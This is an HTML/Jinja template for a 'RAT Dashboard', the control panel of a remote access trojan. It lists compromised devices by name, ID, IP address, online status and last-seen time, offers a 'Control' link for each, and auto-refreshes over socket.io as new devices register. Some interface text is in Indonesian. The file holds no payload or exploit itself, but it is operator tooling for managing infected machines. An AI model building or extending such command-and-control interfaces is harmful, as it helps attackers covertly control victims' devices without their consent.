<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - RAT Controller</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            background: #0a0015;
            min-height: 100vh;
            padding: 20px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 24px;
            background: linear-gradient(135deg, #1a0030, #2d004d);
            border-radius: 16px;
            border: 1px solid rgba(168, 85, 247, 0.3);
            margin-bottom: 24px;
        }
        .header h1 {
            color: #a855f7;
            font-size: 24px;
        }
        .header a {
            color: #c4b5d4;
            text-decoration: none;
            padding: 8px 20px;
            border-radius: 8px;
            background: rgba(168, 85, 247, 0.2);
            transition: 0.3s;
        }
        .header a:hover { background: rgba(168, 85, 247, 0.4); }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px;
        }
        .card {
            background: linear-gradient(145deg, #1a0030, #2d004d);
            border: 1px solid rgba(168, 85, 247, 0.2);
            border-radius: 16px;
            padding: 20px;
            transition: 0.3s;
        }
        .card:hover { border-color: #a855f7; box-shadow: 0 0 30px rgba(168, 85, 247, 0.1); }
        .card .device-name {
            color: #d8b4fe;
            font-size: 18px;
            font-weight: bold;
        }
        .card .device-id {
            color: #6b5b7b;
            font-size: 12px;
            margin-top: 4px;
        }
        .card .device-info {
            color: #c4b5d4;
            font-size: 13px;
            margin-top: 8px;
            display: flex;
            justify-content: space-between;
        }
        .card .status {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .card .status.online { background: #22c55e; color: #000; }
        .card .status.offline { background: #ef4444; color: #fff; }
        .card .btn-control {
            display: inline-block;
            margin-top: 12px;
            padding: 8px 16px;
            border-radius: 8px;
            background: linear-gradient(135deg, #7c3aed, #a855f7);
            color: #fff;
            text-decoration: none;
            font-size: 13px;
            transition: 0.3s;
        }
        .card .btn-control:hover { transform: scale(1.05); }
        .empty {
            color: #6b5b7b;
            text-align: center;
            padding: 60px 0;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🐀 RAT Dashboard</h1>
        <a href="/logout">Logout</a>
    </div>

    <div class="grid" id="devicesGrid">
        {% if devices %}
            {% for id, device in devices.items() %}
            <div class="card">
                <div class="device-name">{{ device.name }}</div>
                <div class="device-id">ID: {{ id[:12] }}...</div>
                <div class="device-info">
                    <span>IP: {{ device.ip }}</span>
                    <span class="status {{ device.status }}">{{ device.status }}</span>
                </div>
                <div class="device-info" style="font-size:11px; color:#6b5b7b;">
                    Last seen: {{ device.last_seen }}
                </div>
                <a href="/device/{{ id }}" class="btn-control">🎮 Control</a>
            </div>
            {% endfor %}
        {% else %}
            <div class="empty">Belum ada perangkat terhubung</div>
        {% endif %}
    </div>

    <script>
        const socket = io();
        socket.on('device_registered', function(data) {
            location.reload();
        });
    </script>

    <!-- DI BAGIAN BAWAH SEBELUM </body> -->
    <script src="/static/js/script.js"></script>
    <script>
        // AUTO REFRESH
        setInterval(fetchDevices, 5000);
    </script>
</body>
</html>
